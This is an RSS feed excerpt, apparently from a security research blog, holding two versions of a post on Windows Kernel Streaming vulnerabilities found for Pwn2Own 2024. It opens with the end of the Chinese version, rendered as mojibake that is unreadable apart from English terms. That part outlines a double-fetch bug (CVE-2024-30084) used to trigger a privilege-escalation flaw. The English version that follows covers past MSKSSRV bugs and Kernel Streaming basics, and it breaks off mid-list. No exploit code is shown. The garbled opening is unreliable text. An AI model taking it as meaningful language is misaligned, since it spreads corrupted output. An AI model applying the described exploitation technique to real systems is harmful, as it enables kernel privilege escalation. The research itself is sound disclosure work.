&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Á∂ìÈÅéË™øÊü•ÂæåÁôºÁèæÂà∞ Hyper-V Âú®È†êË®≠ÊÉÖÊ≥Å‰∏ã‰∏¶‰∏çÊúÉÊúâÈü≥Ë®äË®≠ÂÇôÔºåÈÄ†Êàê exploit ÊúÉÂ§±Êïó„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú® Hyper-V ‰∏≠ÔºåÈ†êË®≠ÊÉÖÊ≥Å‰∏ãÂè™ÊúÉÊúâ MSKSSRVÔºåÁÑ∂ËÄå MSKSSRV ‰πüÊ≤íÊúâ KSPROPSETID_DrmAudioStream ÈÄôÂÄã PropertyÔºå‰ΩøÂæóÊàëÂÄëÁÑ°Ê≥ïÊàêÂäüÂà©Áî®ÈÄôÂÄãÊºèÊ¥ûÈÅîÊàê EoPÔºåÂõ†Ê≠§ÊàëÂÄëÂøÖÈ†àÊâæÂÖ∂‰ªñÊñπÂºèËß∏ÁôºÊàñËÄÖÊâæÊñ∞ÁöÑÊºèÊ¥ûÔºåÊ≠§ÊôÇÊàëÂÄëÊ±∫ÂÆöÈáçÊñ∞ Review ‰∏ÄÈÅçÊï¥ÂÄãÊµÅÁ®ãÔºåÁúãÁúãÊòØÂê¶ÈÇÑÊúâÂÖ∂‰ªñÂèØËÉΩÂà©Áî®ÁöÑÂú∞Êñπ„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;cve-2024-30084&quot;&gt;CVE-2024-30084&lt;/h3&gt;
&lt;p&gt;ÈáçÊñ∞ÂØ©Ë¶ñÂæåÔºåÁôºÁèæÂà∞ IOCTL_KS_PROPERTY ÊòØ‰ΩøÁî® &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-neither-buffered-nor-direct-i-o&quot;&gt;Neither I/O&lt;/a&gt; ‰æÜÂÇ≥ÈÅûË≥áÊñôÁöÑÔºå‰πüÂ∞±ÊòØË™™ÊúÉÁõ¥Êé•Êãø‰ΩøÁî®ËÄÖÁöÑ Input buffer ‰æÜÂÅöË≥áÊñô‰∏äÁöÑËôïÁêÜÔºå‰∏ÄËà¨‰æÜË™™‰∏çÂ§™Âª∫Ë≠∞‰ΩøÁî®ÈÄôÂÄãÊñπÊ≥ïÔºåÂæàÂ∏∏Âá∫Áèæ Double Fetch ÁöÑÂïèÈ°å„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÂèØÂæû‰∏äÂúñ‰∏≠ KspPropertyHandler ÁúãÂà∞ÔºåÂú®‰ΩøÁî®ËÄÖÂëºÂè´ IOCTL ‰πãÂæåÔºåÊúÉÁõ¥Êé•Â∞á Type3InputBuffer Ë§áË£ΩÂà∞Êñ∞ÂàÜÈÖçÂá∫‰æÜÁöÑ Buffer ‰∏≠ÔºåÂÖ∂‰∏≠ÊúÉÂ≠òÊúâ &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/stream/ksproperty-structure&quot;&gt;KSPROPERTY&lt;/a&gt; ÁµêÊßãÔºåÊé•‰∏ã‰æÜÊúÉÁî®ÈÄôÁµêÊßã‰∏≠ÁöÑ GUID ‰æÜÊü•Ë©¢ Property ÊòØÂê¶ÊúâÂú®Ë©≤Ë®≠ÂÇôÊâÄÊîØÊè¥ÁöÑ Property ‰∏≠ÔºåËã•Â≠òÂú®ÊâçÊúÉÁπºÁ∫åÂæÄ‰∏ãÂëºÂè´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt;„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÄôÈÇäÊàëÂÄëÂÜçÂõûÈ†≠Áúã‰∏ÄÁúº &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt;„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÂèØ‰ª•ÁôºÁèæÂà∞Ôºå&lt;strong&gt;ÂÆÉÂèàÂÜçÊ¨°Âæû Type3InputBuffer Ë§áË£Ω‰ΩøÁî®ËÄÖÊâÄÊèê‰æõÁöÑË≥áÊñô&lt;/strong&gt;ÂÅöÁÇ∫Êñ∞ÁöÑ IOCTL ÁöÑËº∏ÂÖ•ÔºåÂæàÊòéÈ°ØÁöÑÈÄôÈÇäÂ∞±Â≠òÂú®‰∫Ü‰∏ÄÂÄã Double Fetch ÁöÑÊºèÊ¥ûÔºåÂõ†Ê≠§ÊàëÂÄëÂ∞áÊï¥ÂÄãÂà©Áî®ÊµÅÁ®ãÊîπÊàê‰∏ãÂúñÁöÑÊ®£Â≠ê&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊàëÂÄë‰∏ÄÈñãÂßãÁôºÈÄÅ IOCTL_KS_PROPERTY ÊôÇÔºåÂ∞±ÊúÉÂÖà‰ª• MSKSSRV Êó¢ÊúâÁöÑ Property &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_Service&lt;/code&gt; ‰æÜÂÅöÂæåÁ∫åÊìç‰ΩúÔºåËÄåÂú®Âúñ‰∏≠Á¨¨ 6 Ê≠•ÊôÇÔºåÊúÉÂÖàË§áË£Ω‰∏Ä‰ªΩ Property ÁöÑ GUID Âà∞ Kernel ‰∏≠ÔºåËÄåÂæåÂÜçÁî®ÈÄôÂÄã Property GUID ÂéªÊü•Ë©¢ÊòØÂê¶ÊúâÂú®Ë©≤ KS Object ÁöÑÊîØÊè¥Ê∏ÖÂñÆ‰∏≠ÔºåËÄåÈÄôÈÇäÂõ†ÁÇ∫ MSKSSRV ÊúâÊîØÊè¥ÔºåÂ∞±ÊúÉÂæÄ‰∏ãÂëºÂè´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt;„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú®ÂëºÂè´ UnserializePropertySet ÂæåÔºåÂõ†ÁÇ∫Êúâ Double Fetch ÁöÑÊºèÊ¥ûÔºåËÆìÊàëÂÄëÂèØ‰ª•Âú®Ê™¢Êü•ÂæåÂà∞‰ΩøÁî®‰πãÈñìÔºåÂ∞á &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_Service&lt;/code&gt; ÊèõÊàê &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt; ÔºåËÄåÊé•‰∏ã‰æÜÂ∞±ÂèØ‰ª•ËÆì ks ‰ΩøÁî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt; ‰ΩúÁÇ∫ requests ‰æÜÁôºÈÄÅ IOCTLÔºåÂæûËÄåËß∏ÁôºÂâçËø∞‰∫Ü CVE-2024-35250 ÈÇèËºØÊºèÊ¥ûÔºå‰ΩøÈÄôÂÄãÊºèÊ¥û‰∏çË´ñÂú®ÁîöÈ∫ºÁí∞Â¢É‰∏ãÈÉΩÂèØ‰ª•‰ΩøÁî®„ÄÇ&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/xNUj_XZ9LhQ?si=ONmvl9_8BV-z0idL&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;ÊúÄÁµÇÊàëÂÄëÊàêÂäüÂú® Pwn2Own Vancouver 2024 ‰∏≠ÔºåÊàêÂäüÊîª‰∏ã Micorsoft Windows 11„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú® Pwn2Own ÁµêÊùüÂæåÔºåÁ∂ìÈÅéÊàëÂÄëË™øÊü•ÔºåÁôºÁèæÂà∞ÈÄôÂÄãÊºèÊ¥ûÂæû Windows 7 Â∞±Â≠òÂú®‰∫ÜÔºåËá≥Â∞ëÂ≠òÂú®Â∞áËøë 20 Âπ¥ÔºåËÄå‰∏îÂà©Áî®‰∏äÈùûÂ∏∏Á©©ÂÆöÔºåÊúâËëóÁôæÂàÜ‰πãÁôæÁöÑÊàêÂäüÁéáÔºåÂº∑ÁÉàÂª∫Ë≠∞Â§ßÂÆ∂Áõ°ÈÄüÊõ¥Êñ∞Ëá≥ÊúÄÊñ∞ÁâàÊú¨ „ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;to-be-continued&quot;&gt;To be continued&lt;/h2&gt;
&lt;p&gt;ÈÄôÁØá‰∏ªË¶ÅËëóÈáçÂú®ÊàëÂÄëÂ¶Ç‰ΩïÊâæÂà∞‰ªäÂπ¥Âú® Pwn2Own ‰∏≠ÊâÄ‰ΩøÁî®ÁöÑÊºèÊ¥ûÂèä Kernel Streaming ÁöÑÊîªÊìäÈù¢ÂàÜÊûê„ÄÇÂú®ÊâæÂà∞ÈÄôÂÄãÊ¥û‰πãÂæåÔºåÊàëÂÄëÂæåÁ∫å‰πüÊåÅÁ∫åÊúùÈÄôÂÄãÊñπÂêëÁπºÁ∫åÁ†îÁ©∂Ôºå‰πüÁôºÁèæ‰∫ÜÂè¶Â§ñ‰∏ÄÂÄã‰πüÊòØ Exploitable ÁöÑÊºèÊ¥û‰ª•ÂèäÂÖ∂‰ªñÊõ¥Â§öÊúâË∂£ÁöÑÊºèÊ¥ûÔºåÊàëÂÄëÈ†êË®àÂú®‰ªäÂπ¥ÂçÅÊúàÁôºË°®ÔºåÊï¨Ë´ãÊúüÂæÖ Part II„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/&quot;&gt;Critically Close to Zero-Day: Exploiting Microsoft Kernel Streaming Service&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://conference.hitb.org/hitbsecconf2023hkt/materials/D2T1%20-%20Windows%20Kernel%20Security%20-%20A%20Deep%20Dive%20into%20Two%20Exploits%20Demonstrated%20at%20Pwn2Own%20-%20Thomas%20Imbert.pdf&quot;&gt;Windows Kernel Security - A Deep Dive into Two Exploits Demonstrated at Pwn2Own&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://big5-sec.github.io/posts/CVE-2023-29360-analysis/&quot;&gt;CVE-2023-29360 Analysis&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://securityintelligence.com/x-force/little-bug-that-could/&quot;&gt;Racing Round and Round: The Little Bug That Could&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html&quot;&gt;Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2021/01/hunting-for-bugs-in-windows-mini-filter.html&quot;&gt;Hunting for Bugs in Windows Mini-Filter Drivers&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/blog/2019/03/local-privilege-escalation-via-the-windows-i-o-manager-a-variant-finding-collaboration/&quot;&gt;Local Privilege Escalation via the Windows I/O Manager: A Variant Finding &amp;amp; Collaboration&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/</link>
                <guid>https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1</guid>
                <pubDate>Fri, 23 Aug 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Streaming vulnerabilities from Windows Kernel - Proxying to Kernel - Part I</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/&quot;&gt;‰∏≠ÊñáÁâàÊú¨&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Over the past few decades, vulnerabilities in the Windows Kernel have emerged frequently. The popular attack surface has gradually shifted from Win32k to CLFS (Common Log File System). Microsoft has continuously patched these vulnerabilities, making these targets increasingly secure. However, which component might become the next attack target? Last year, MSKSSRV (Microsoft Kernel Streaming Service) became a popular target for hackers. However, this driver is tiny and can be analyzed in just a few days. Does this mean there might not be new vulnerabilities?&lt;/p&gt;

&lt;p&gt;This research will discuss an overlooked attack surface that allowed us to find more than ten vulnerabilities within two months. Additionally, we will delve into a proxy-based logical vulnerability type that allows us to bypass most validations, enabling us to successfully exploit Windows 11 in Pwn2Own Vancouver 2024.&lt;/p&gt;

&lt;p&gt;(This research will be divided into several parts, each discussing different bug classes and vulnerabilities. This research was also presented at &lt;a href=&quot;https://hitcon.org/2024/CMT/agenda/d6903413-cfba-4b80-a758-af9a257063d0/&quot;&gt;HITCON CMT 2024&lt;/a&gt;.)&lt;/p&gt;

&lt;h2 id=&quot;start-from-mskssrv&quot;&gt;Start from MSKSSRV&lt;/h2&gt;
&lt;blockquote&gt;
  &lt;p&gt;For vulnerability research, looking at historical vulnerabilities is indispensable.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Initially, we aimed to challenge Windows 11 in Pwn2Own Vancouver 2024. Therefore, we began by reviewing past Pwn2Own events and recent in-the-wild Windows vulnerabilities, searching for potential attack surfaces. Historical trends show that Win32K, primarily responsible for handling GDI-related operations, has always been a popular target, with numerous vulnerabilities still emerging. Since 2018, CLFS (Common Log File System) has also gradually become a popular target. Both components are extremely complex, suggesting that there are likely still many vulnerabilities.  However, becoming familiar with these components requires significant time, and many researchers are already examining them. Therefore, we did not choose to analyze them first.&lt;/p&gt;

&lt;p&gt;Last year, after &lt;a href=&quot;https://www.synacktiv.com/en&quot;&gt;Synacktiv&lt;/a&gt; successfully exploited a &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-29360&quot;&gt;vulnerability&lt;/a&gt; in MSKSSRV to compromise Windows 11 during Pwn2Own 2023, many researchers began to focus on this component. Shortly thereafter, a second vulnerability ,&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36802&quot;&gt;CVE-2023-36802&lt;/a&gt;, was discovered. At this time, &lt;a href=&quot;https://x.com/chompie1337&quot;&gt;chompie&lt;/a&gt; also published an &lt;a href=&quot;https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/&quot;&gt;excellent blog post&lt;/a&gt; detailing this vulnerability and its exploitation techniques. Given that this component is very small, with a file size of approximately 72 KB, it might only take a few days of careful examination to fully understand it. Therefore, we chose MSKSSRV for historical vulnerability analysis, with the hopeful prospect of identifying other vulnerabilities.&lt;/p&gt;

&lt;p&gt;We will briefly discuss these two vulnerabilities but not go into much detail.&lt;/p&gt;

&lt;h3 id=&quot;cve-2023-29360---logical-vulnerability&quot;&gt;CVE-2023-29360 - logical vulnerability&lt;/h3&gt;
&lt;p&gt;The first one is the vulnerability used by Synacktiv in Pwn2Own Vancouver 2023.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is a logical vulnerability in the MSKSSRV driver. When MSKSSRV uses &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmprobeandlockpages&quot;&gt;MmProbeAndLockPages&lt;/a&gt; to lock user-specified memory address as framebuffer, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AccessMode&lt;/code&gt; was not set correctly. This leads to a failure to check whether the user-specified address belongs to the user space. If the user provides a kernel address, it will map the specified kernel address to user space for the user to use. Ultimately, this allows the user to write data to any address in the kernel. The exploitation is simple and very stable, making it become &lt;a href=&quot;https://www.cisa.gov/news-events/alerts/2024/02/29/cisa-adds-one-known-exploited-vulnerability-catalog&quot;&gt;one of the most popular vulnerabilities&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;For more details, please refer to &lt;a href=&quot;https://conference.hitb.org/hitbsecconf2023hkt/materials/D2T1%20-%20Windows%20Kernel%20Security%20-%20A%20Deep%20Dive%20into%20Two%20Exploits%20Demonstrated%20at%20Pwn2Own%20-%20Thomas%20Imbert.pdf&quot;&gt;Synacktiv‚Äôs presentation at HITB 2023 HKT&lt;/a&gt; and &lt;a href=&quot;https://x.com/Big5_sec&quot;&gt;Nicolas Zilio(@Big5_sec)&lt;/a&gt; ‚Äòs blog &lt;a href=&quot;https://big5-sec.github.io/posts/CVE-2023-29360-analysis/&quot;&gt;post&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;cve-2023-36802---type-confusion&quot;&gt;CVE-2023-36802 - type confusion&lt;/h3&gt;
&lt;p&gt;This vulnerability was discovered shortly after CVE-2023-29360 was released. It was already being exploited when Microsoft released their patches. This is a very easily discovered vulnerability. It uses the objects (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FSContextReg&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FSStreamReg&lt;/code&gt;) stored in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FILE_OBJECT-&amp;gt;FsContext2&lt;/code&gt; for subsequent processing. However, there is no check on the type of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FsContext2&lt;/code&gt;, leading to type confusion. For detailed information, you can refer to the &lt;a href=&quot;https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/&quot;&gt;IBM X-Force blog&lt;/a&gt;, which provides a very thorough explanation.&lt;/p&gt;

&lt;p&gt;Since then, there have been very few vulnerabilities related to MSKSSRV. Due to its relatively small size, MSKSSRV is quickly reviewed, and gradually, fewer and fewer people pay attention to it.&lt;/p&gt;

&lt;h3 id=&quot;but-is-that-the-end-of-it-&quot;&gt;But is that the end of it ?&lt;/h3&gt;
&lt;p&gt;However, does this mean there are no more vulnerabilities?&lt;/p&gt;

&lt;p&gt;In fact, the entire Kernel Streaming looks like the diagram below:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;MSKSSRV is just the tip of the iceberg. In fact, there are many other potential components, and those listed in the diagram above are all part of Kernel Streaming. After delving into this attack surface, numerous vulnerabilities were eventually discovered, flowing like a stream.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/cover.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By the way, while I was writing this blog, chompie also &lt;a href=&quot;https://securityintelligence.com/x-force/little-bug-that-could&quot;&gt;published&lt;/a&gt; about the vulnerability she used in this year‚Äôs Pwn2Own Vancouver 2024, &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30089&quot;&gt;CVE-2024-30089&lt;/a&gt;, which is also a vulnerability in MSKSSRV. The vulnerability lies in handling the reference count, requiring a lot of attention and thought to discover. It is also quite interesting, but I won‚Äôt discuss it here. I highly recommend reading &lt;a href=&quot;https://securityintelligence.com/x-force/little-bug-that-could&quot;&gt;this one&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;brief-overview-of-kernel-streaming&quot;&gt;Brief overview of Kernel Streaming&lt;/h2&gt;
&lt;p&gt;So, what is Kernel Streaming? In fact, we use it very frequently.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On Windows systems, when we open the webcam, enable sound, and activate audio devices such as microphones, the system needs to write or read related data such as your voice and captured images from your devices into RAM. It is essential to read data into your computer more efficiently during this process. Microsoft provides a framework called &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/kernel-streaming&quot;&gt;Kernel Streaming&lt;/a&gt; to handle these data, which &lt;strong&gt;primarily operates in kernel mode&lt;/strong&gt;. It features low latency, excellent scalability, and a unified interface, making handling streaming data more convenient and efficient.&lt;/p&gt;

&lt;p&gt;In Microsoft‚Äôs Kernel Streaming, three multimedia class driver models are provided: port class, AVStream, and stream class. We will briefly introduce port class and AVStream, as stream class is less common and more outdated and will not be discussed here.&lt;/p&gt;

&lt;h3 id=&quot;port-class&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/audio/introduction-to-port-class&quot;&gt;Port class&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;This type of driver is mostly used for PCI and DMA-based audio device hardware drivers. Currently, most audio-related processing, such as volume control or microphone-related processing, falls into this category. The main component library used would be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;portcls.sys&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;avstream&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/avstream-overview&quot;&gt;AVStream&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;AVStream is a multimedia driver provided by Microsoft that primarily supports video-only and integrated audio/video streaming. Currently, most video-related processing, such as your webcam, capture card, etc., is associated with this category.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In fact, the use of Kernel Streaming is also very complex. We will only provide a brief description. For more detailed information, please refer to &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/&quot;&gt;Microsoft Learn&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;interact-with-device&quot;&gt;Interact with device&lt;/h2&gt;

&lt;p&gt;When we want to interact with audio devices or webcams, we need to open the device just like with any other device. Essentially, it interacts with the device driver in the same way. So, what would the names of these types of devices be? These names are not typically like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\Device\NamedPipe&lt;/code&gt;, but rather something like the following:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\\?\hdaudio#subfunc_01&amp;amp;ven_8086&amp;amp;dev_2812&amp;amp;nid_0001&amp;amp;subsys_00000000&amp;amp;rev_1000#6&amp;amp;2f1f346a&amp;amp;0&amp;amp;0002&amp;amp;0000001d#{6994ad04-93ef-11d0-a3cc-00a0c9223196}\ehdmiouttopo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;enumerate-device&quot;&gt;Enumerate device&lt;/h3&gt;
&lt;p&gt;Here you can use APIs such as &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows/win32/api/setupapi/nf-setupapi-setupdigetclassdevsw&quot;&gt;SetupDiGetClassDevs&lt;/a&gt; to enumerate devices. Generally, KS series devices are registered under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSCATEGORY*&lt;/code&gt;, such as audio devices which are registered under &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/install/kscategory-audio&quot;&gt;KSCATEGORY_AUDIO&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Additionally, you can use the APIs provided by KS, such as &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ksproxy/nf-ksproxy-ksopendefaultdevice&quot;&gt;KsOpenDefaultDevice&lt;/a&gt;, to obtain the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handle&lt;/code&gt; of the first matching PnP device in that category. Actually, it is just a wrapper around &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SetupDiGetClassDevs&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateFile&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KsOpenDefaultDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSCATEGORY_VIDEO_CAMERA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GENERIC_READ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GENERIC_WRITE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g_hDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;kernel-streaming-object&quot;&gt;Kernel Streaming object&lt;/h3&gt;

&lt;p&gt;After we open these devices, Kernel Streaming will create some Kernel Streaming related instances, the most important of which are &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ks-filters&quot;&gt;KS Filters&lt;/a&gt; and &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ks-pins&quot;&gt;KS Pins&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;These will be used during the Kernel Streaming process. We will only provide a brief introduction here. We will use &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/audio/audio-filters&quot;&gt;audio filters&lt;/a&gt; as an example, as most others are quite similar.&lt;/p&gt;

&lt;h4 id=&quot;ks-filters&quot;&gt;KS filters&lt;/h4&gt;
&lt;p&gt;Each KS Filter typically represents a device or a specific function of a device. When we open an audio device, it usually corresponds to a KS filter object. When we read data from the audio device, this data is first processed through this KS Filter.&lt;/p&gt;

&lt;p&gt;Conceptually, as shown in the diagram below, the large box in the middle represents a KS filter for the audio device. When we want to read data from the audio device, it is read into the filter from the left, processed through several nodes, and then output from the right.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/7.png&quot; alt=&quot;&quot; /&gt;
 (From: https://learn.microsoft.com/en-us/windows-hardware/drivers/audio/audio-filters)&lt;/p&gt;

&lt;h4 id=&quot;ks-pins&quot;&gt;KS pins&lt;/h4&gt;
&lt;p&gt;In the figure above, the points for reading and outputting data are called pins. The kernel also has corresponding KS pin Objects to describe the Pins, recording whether the Pin is a sink or a source, the data format for input and output, and so on. When we use it, we must &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/nf-ks-kscreatepin&quot;&gt;open a pin&lt;/a&gt; on the filters to create an instance to read from or write to the device.&lt;/p&gt;

&lt;h3 id=&quot;ks-property&quot;&gt;KS property&lt;/h3&gt;

&lt;p&gt;Each of these KS objects will have its own property, and each property corresponds to a specific feature. For instance, the data format mentioned earlier in the Pin, the volume level, and the status of the device are all properties. These properties typically correspond to a set of GUIDs. We can set these properties through &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_property&quot;&gt;IOCTL_KS_PROPERTY&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;This greatly simplifies the development of multimedia drivers and ensures consistency and scalability across different devices.&lt;/p&gt;

&lt;h3 id=&quot;read-streams-from-webcam&quot;&gt;Read streams from webcam&lt;/h3&gt;
&lt;p&gt;Here is a simple example illustrating how an application can read data from a webcam.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The most basic flow is roughly shown in this diagram:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Open the device to obtain the device handle.&lt;/li&gt;
  &lt;li&gt;Use this device handle to create an instance of the Pin on this filter and obtain the Pin handle.&lt;/li&gt;
  &lt;li&gt;Use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_PROPERTY&lt;/code&gt; to set the device state of the Pin to RUN.&lt;/li&gt;
